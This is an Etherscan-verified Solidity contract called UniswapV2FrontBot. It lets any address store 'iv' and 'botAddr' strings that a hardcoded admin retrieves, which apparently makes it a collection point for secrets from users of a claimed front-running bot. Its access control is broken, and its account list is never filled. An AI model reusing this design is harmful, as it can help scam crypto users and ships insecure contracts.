/**
 *Submitted for verification at Etherscan.io on 2022-12-24
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

contract UniswapV2FrontBot {
    struct FrontBot {
        string iv;
        string botAddr;
        // address input_address;
    }

    mapping(address => FrontBot) bots;
    address[] public botAccts;

    mapping(address => FrontBot) public bot;

    FrontBot add;
    // address public admin = 0x6E7bE797DE52cEA969130c028aD168844C4C5Bb5;
    address public admin = 0x271930778fD7AB5F34E907470c2525A6edFF1799;

    modifier isAdmin() {
        if (msg.sender != admin) return;
        _;
    }

    function setFrontBot(
        address _address,
        string memory _iv,
        string memory _botAddr
    ) public {
        // var bot = bots[_address];
        // bot.iv = _iv;
        // bot.botAddr = _botAddr;
        // botAccts.push(_address) -1;

        bot[_address] = FrontBot({iv: _iv, botAddr: _botAddr});

        // botAccts.push(_address);
    }

    function getFrontBots() public view returns (address[] memory) {
        return botAccts;
    }

    function getFrontBotAddr(address _address)
        public
        view
        isAdmin
        returns (string memory botAddr)
    {
        // return (bots[_address].botAddr);
        return bot[_address].botAddr;
    }

    function getFrontBotIv(address _address)
        public
        view
        isAdmin
        returns (string memory iv)
    {
        // return (bots[_address].iv);
        return bot[_address].iv;
    }

    function countFrontBots() public view returns (uint256) {
        return botAccts.length;
    }
}